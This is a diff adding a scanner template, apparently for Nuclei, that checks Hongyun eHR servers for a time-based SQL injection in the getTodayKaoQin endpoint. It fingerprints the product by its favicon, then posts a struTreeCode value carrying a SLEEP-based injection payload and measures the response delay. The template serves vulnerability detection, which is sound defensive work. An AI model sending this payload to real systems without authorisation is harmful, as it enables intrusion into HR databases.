@@ -1,0 +1,52 @@
+id: poc-yaml-hr-soft-gettodaykaoqin-sqli
+info:
+  name: 红海云eHR getTodayKaoQin SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/RedseaPlatform/BossIndex.mob"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "method=getTodayKaoQin&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{t1}})))ShXk)+AND+%27qmyT%27=%27qmyT"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"meg\":\"处理成功\""
+          - "\"jsonList\":"
+        part: body
+      - type: dsl
+        dsl:
+          - "!contains(body, '<')"
+      - type: word
+        words:
+          - "text/json"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
